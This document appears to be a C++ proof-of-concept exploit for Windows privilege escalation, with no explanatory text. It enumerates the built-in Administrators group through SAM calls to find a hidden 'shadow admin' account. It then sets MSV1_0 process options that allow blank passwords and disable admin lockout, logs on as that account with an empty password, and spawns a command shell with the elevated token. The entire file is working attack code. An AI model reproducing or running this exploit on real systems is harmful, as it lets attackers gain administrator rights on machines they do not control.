#include "stdafx.h"

HRESULT GetLastHrEx(ULONG dwError = GetLastError());

HRESULT ExecCmd(HANDLE hToken)
{
	WCHAR cmd[MAX_PATH];

	if (GetEnvironmentVariableW(L"ComSpec", cmd, _countof(cmd)))
	{
		STARTUPINFOW si = { sizeof(si) };
		PROCESS_INFORMATION pi;
		ULONG SessionId = RtlGetCurrentPeb()->SessionId;
		NtSetInformationToken(hToken, TokenSessionId, &SessionId, sizeof(SessionId));
		if (CreateProcessAsUserW(hToken, cmd, const_cast<PWSTR>(L"* /k whoami"), 0, 0, 0, 0, 0, 0, &si, &pi))
		{
			NtClose(pi.hThread);
			NtClose(pi.hProcess);

			return S_OK;
		}
	}

	return GetLastHrEx();
}

#include "sami.h"
//
// MsV1_0SetProcessOption submit buffer - for submitting a buffer
// an call to LsaCallAuthenticationPackage().
//

#define MSV1_0_OPTION_ALLOW_BLANK_PASSWORD      0x01
#define MSV1_0_OPTION_DISABLE_ADMIN_LOCKOUT     0x02
#define MSV1_0_OPTION_DISABLE_FORCE_GUEST       0x04
#define MSV1_0_OPTION_ALLOW_OLD_PASSWORD        0x08
#define MSV1_0_OPTION_TRY_CACHE_FIRST           0x10

typedef struct _MSV1_0_SETPROCESSOPTION_REQUEST {
	MSV1_0_PROTOCOL_MESSAGE_TYPE MessageType;
	ULONG ProcessOptions;
	BOOLEAN DisableOptions;
} MSV1_0_SETPROCESSOPTION_REQUEST, * PMSV1_0_SETPROCESSOPTION_REQUEST;

const volatile UCHAR guz = 0;

NTSTATUS GetLogonSid(_Out_ PSID_AND_ATTRIBUTES LogonSid)
{
	HANDLE hToken;

	if (WTSQueryUserToken(RtlGetCurrentPeb()->SessionId, &hToken))
	{
		NTSTATUS status;

		union {
			PVOID buf;
			PTOKEN_GROUPS ptg;
		};

		PVOID stack = alloca(guz);
		ULONG cb = 0, rcb = 0x100;

		do
		{
			if (cb < rcb)
			{
				cb = RtlPointerToOffset(buf = alloca(rcb - cb), stack);
			}
			status = NtQueryInformationToken(hToken, TokenGroups, buf, cb, &rcb);

		} while (STATUS_BUFFER_TOO_SMALL == status);

		NtClose(hToken);

		if (0 > status)
		{
			return status;
		}

		if (ULONG GroupCount = ptg->GroupCount)
		{
			PSID_AND_ATTRIBUTES Groups = ptg->Groups;
			do
			{
				if (Groups->Attributes & SE_GROUP_LOGON_ID)
				{
					PSID Sid = Groups->Sid;
					if (SECURITY_LOGON_IDS_RID_COUNT == *RtlSubAuthorityCountSid(Sid) &&
						SECURITY_LOGON_IDS_RID == *RtlSubAuthoritySid(Sid, 0))
					{
						LogonSid->Attributes = Groups->Attributes;
						return RtlCopySid(SECURITY_SID_SIZE(SECURITY_LOGON_IDS_RID_COUNT), LogonSid->Sid, Sid);
					}
				}
			} while (Groups++, --GroupCount);
		}

		return STATUS_NO_SUCH_GROUP;
	}

	return GetLastHrEx();
}

NTSTATUS LogonIUser(_In_ PCWSTR DomainName, _In_ PCWSTR UserName, _In_ PCWSTR Password)
{
	MessageBoxW(0, UserName, L"Shadow Admin", MB_ICONINFORMATION);

	NTSTATUS SubStatus, status = STATUS_INTERNAL_ERROR;

	UCHAR Sid[SECURITY_SID_SIZE(SECURITY_LOGON_IDS_RID_COUNT)];

	TOKEN_GROUPS LocalGroups = { 1, { Sid } };

	HANDLE LsaHandle;

	union {
		PVOID AuthenticationInformation;
		PMSV1_0_INTERACTIVE_LOGON mil;
	};

	ULONG cb = 0;

	union {
		PVOID buf = 0;
		PWSTR psz;
		ULONG_PTR up;
	};

	int len = 0;

	while (0 < (len = _snwprintf(psz, len, L"%ws%c%ws%c%ws", DomainName, 0, UserName, 0, Password)))
	{
		if (buf)
		{
			mil->MessageType = MsV1_0InteractiveLogon;
			RtlInitUnicodeString(&mil->LogonDomainName, psz);
			RtlInitUnicodeString(&mil->UserName, psz += wcslen(psz) + 1);
			RtlInitUnicodeString(&mil->Password, psz += wcslen(psz) + 1);

			status = STATUS_SUCCESS;
			break;
		}

		AuthenticationInformation = alloca(cb = sizeof(MSV1_0_INTERACTIVE_LOGON) + ++len * sizeof(WCHAR));
		RtlZeroMemory(mil, sizeof(MSV1_0_INTERACTIVE_LOGON));
		buf = mil + 1;
	}

	if (0 <= status && 0 <= (status = GetLogonSid(LocalGroups.Groups)) &&
		0 <= (status = LsaConnectUntrusted(&LsaHandle)))
	{
		ULONG ulAuthPackage;
		LSA_STRING PackageName;
		RtlInitString(&PackageName, MSV1_0_PACKAGE_NAME);//NEGOSSP_NAME_A
		if (0 <= (status = LsaLookupAuthenticationPackage(LsaHandle, &PackageName, &ulAuthPackage)))
		{
			//////////////////////////////////////////////////////////////////////////
			PVOID ProtocolReturnBuffer = 0;
			ULONG ReturnBufferLength;
			MSV1_0_SETPROCESSOPTION_REQUEST spo = {
				MsV1_0SetProcessOption, MSV1_0_OPTION_ALLOW_BLANK_PASSWORD|MSV1_0_OPTION_DISABLE_ADMIN_LOCKOUT, FALSE
			};

			status = LsaCallAuthenticationPackage(
				LsaHandle, ulAuthPackage, &spo, sizeof(spo),
				&ProtocolReturnBuffer, &ReturnBufferLength, &SubStatus);

			DbgPrint("MSV1_0_OPTION_ALLOW_BLANK_PASSWORD=%x(%x)\r\n", status, SubStatus);

			if (ProtocolReturnBuffer) LsaFreeReturnBuffer(ProtocolReturnBuffer);

			//////////////////////////////////////////////////////////////////////////
			PVOID ProfileBuffer;
			ULONG ulProfileBufferLen;
			LUID LogonId;
			QUOTA_LIMITS Quotas;
			LSA_STRING lsaOriginName{};
			TOKEN_SOURCE tokenSource{};
			HANDLE hToken;

			if (0 <= (status = LsaLogonUser(LsaHandle, &lsaOriginName, Interactive, ulAuthPackage,
				AuthenticationInformation, cb,
				&LocalGroups,
				&tokenSource,
				&ProfileBuffer,
				&ulProfileBufferLen,
				&LogonId,
				&hToken,
				&Quotas,
				&SubStatus)))
			{
				LsaFreeReturnBuffer(ProfileBuffer);
				status = ExecCmd(hToken);
				NtClose(hToken);
			}
			else
			{
				if (0 > SubStatus)
				{
					status = SubStatus;
				}
			}
		}
	}

	return status;
}

NTSTATUS ExecShadowAdmin()
{
	SAM_HANDLE ServerHandle, DomainHandle, AliasHandle;
	OBJECT_ATTRIBUTES oa = { sizeof(oa) };
	NTSTATUS status = SamConnect(0, &ServerHandle, SAM_SERVER_LOOKUP_DOMAIN, &oa);
	if (0 <= status)
	{
		SID BUILTIN = { SID_REVISION, 1, SECURITY_NT_AUTHORITY, {SECURITY_BUILTIN_DOMAIN_RID } };

		status = SamOpenDomain(ServerHandle, DOMAIN_EXECUTE|DOMAIN_READ, &BUILTIN, &DomainHandle);
		SamCloseHandle(ServerHandle);
		if (0 <= status)
		{
			status = SamOpenAlias(DomainHandle, ALIAS_LIST_MEMBERS, DOMAIN_ALIAS_RID_ADMINS, &AliasHandle);
			SamCloseHandle(DomainHandle);
			if (0 <= status)
			{
				ULONG MemberCount;
				PSID *MemberIds, UserSid;
				status = SamGetMembersInAlias(AliasHandle, &MemberIds, &MemberCount);
				SamCloseHandle(AliasHandle);
				if (0 <= status)
				{
					PVOID buf = MemberIds;
					if (MemberCount)
					{
						do 
						{
							BOOLEAN bShadowAdmin;
							PWSTR UserName;
							if (0 <= (status = SamiIsShadowAdminAccount(*MemberIds++, &bShadowAdmin, &UserName, &UserSid)))
							{
								if (bShadowAdmin)
								{
									SamFreeMemory(UserSid);
									LogonIUser(L".", UserName, L"");
									SamFreeMemory(UserName);
									break;
								}
							}
						} while (--MemberCount);

						if (!MemberCount)
						{
							status = STATUS_NO_SUCH_USER;
						}
					}
					SamFreeMemory(buf);
				}
			}
		}
	}
	return status;
}
